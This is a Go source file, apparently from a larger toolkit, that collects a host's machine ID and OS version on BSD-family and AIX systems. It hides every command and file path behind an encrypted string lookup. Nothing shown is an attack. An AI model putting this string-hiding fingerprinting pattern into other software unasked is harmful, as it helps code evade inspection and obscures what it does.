//go:build !windows && !plan9 && !js && !darwin && !linux && !android && crypt

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package local

import (
	"bytes"
	"os"
	"runtime"
	"strings"

	"github.com/iDigitalFlame/xmt/util/crypt"
)

func sysID() []byte {
	switch {
	case runtime.GOOS[0] == 'a':
		// AIX specific support: https://github.com/denisbrodbeck/machineid/pull/16
		if b, err := output(crypt.Get(70)); err == nil { // lsattr -l sys0 -a os_uuid -E
			if i := bytes.IndexByte(b, ' '); i > 0 {
				return b[i+1:]
			}
			return b
		}
	case runtime.GOOS[0] == 'o':
		// Support get hardware UUID for OpenBSD: https://github.com/denisbrodbeck/machineid/pull/14
		if b, err := output(crypt.Get(71)); err == nil { // sysctl -n hw.uuid
			return b
		}
	}
	if b, err := os.ReadFile(crypt.Get(72)); err == nil { // /etc/hostid
		return b
	}
	o, _ := output(crypt.Get(73)) // kenv -q smbios.system.uuid
	return o
}
func version() string {
	var (
		ok      bool
		b, n, v string
	)
	if m := release(); len(m) > 0 {
		b = m[crypt.Get(2)]                // ID
		if n, ok = m[crypt.Get(65)]; !ok { // PRETTY_NAME
			n = m[crypt.Get(66)] // NAME
		}
		if v, ok = m[crypt.Get(67)]; !ok { // VERSION_ID
			v = m[crypt.Get(68)] // VERSION
		}
	}
	// NOTE(dij): Used a little string hack here since "bsd" is only used here
	//            same with "freebsd-version" so it fits nicely.
	if len(b) == 0 && strings.Contains(runtime.GOOS, crypt.Get(74)[4:7]) { // freebsd-version -k
		if o, err := output(crypt.Get(74)); err == nil { // freebsd-version -k
			b = strings.ReplaceAll(string(o), "\n", "")
		}
	}
	if len(v) == 0 {
		v = uname()
	}
	switch {
	case len(n) == 0 && len(b) == 0 && len(v) == 0:
		return crypt.Get(75) // BSD
	case len(n) == 0 && len(b) > 0 && len(v) > 0:
		return crypt.Get(75) + " (" + v + ", " + b + ")" // BSD
	case len(n) == 0 && len(b) == 0 && len(v) > 0:
		return crypt.Get(75) + " (" + v + ")" // BSD
	case len(n) == 0 && len(b) > 0 && len(v) == 0:
		return crypt.Get(75) + " (" + b + ")" // BSD
	case len(n) > 0 && len(b) > 0 && len(v) > 0:
		return n + " (" + v + ", " + b + ")"
	case len(n) > 0 && len(b) == 0 && len(v) > 0:
		return n + " (" + v + ")"
	case len(n) > 0 && len(b) > 0 && len(v) == 0:
		return n + " (" + b + ")"
	}
	return crypt.Get(75) // BSD
}
